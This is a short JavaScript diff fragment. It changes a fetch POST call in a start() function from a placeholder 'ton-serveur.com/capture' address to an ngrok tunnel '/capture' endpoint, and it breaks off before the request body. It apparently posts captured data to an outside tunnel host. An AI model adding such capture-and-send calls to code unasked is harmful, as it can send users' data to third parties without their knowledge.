@@ -1,6 +1,6 @@
 function start() {
     
-    fetch("https://ton-serveur.com/capture", {
+    fetch("https://stable-notably-hound.ngrok-free.app/capture", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
